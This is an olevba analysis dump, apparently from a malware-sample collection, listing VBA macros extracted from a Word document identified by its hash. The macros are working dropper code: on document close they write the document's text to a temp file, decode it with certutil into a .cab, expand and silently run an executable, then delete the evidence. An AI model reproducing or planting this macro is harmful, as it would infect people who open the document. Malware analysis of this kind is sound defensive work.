@@ -1,0 +1,44 @@
+
+## uploaded by @satya_enki
+
+olevba 0.52dev7 - http://decalage.info/python/oletools
+Flags        Filename                                                         
+-----------  -----------------------------------------------------------------
+OpX:MASI---- 5504e04083d6146a67cb0d671d8ad5885315062c9ee08a62e40e264c2d5eab91
+===============================================================================
+FILE: 5504e04083d6146a67cb0d671d8ad5885315062c9ee08a62e40e264c2d5eab91
+Type: OpenXML
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: word/vbaProject.bin - OLE stream: u'VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Private Sub Document_Close()
+njhnjhjhguhihj
+End Sub
+
+Private Sub Document_New()
+
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO NewMacros.bas 
+in file: word/vbaProject.bin - OLE stream: u'VBA/NewMacros'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Sub njhnjhjhguhihj()
+'
+' njhnjhjhguhihj Macro
+'
+'
+Dim nLen As Long
+Dim p0 As String
+p0 = Environ("temp") & "\ZsHUvtNctKYbgPj.txt"
+nLen = ActiveDocument.Content.End
+Set rContent = ActiveDocument.Range(1, nLen)
+Set fs = CreateObject("Scripting.FileSystemObject")
+Set fs0 = fs.CreateTextFile(p0, True)
+fs0.WriteLine (rContent)
+fs0.Close
+Set sHtfcYbh = CreateObject("Wscript.Shell")
+sHtfcYbh.Run "cmd.exe /c certutil -decode %temp%\\ZsHUvtNctKYbgPj.txt %temp%\\YjhdJ.cab &&expand %temp%\\YjhdJ.cab -F:* %temp%\\&&%temp%\\AYRUNSC.EXE", 0, True
+sHtfcYbh.Run "cmd.exe /c del %temp%\\ZsHUvtNctKYbgPj.txt /q", 0, False
+sHtfcYbh.Run "cmd.exe /c del %temp%\\YjhdJ.cab /q", 0, False
+End Sub
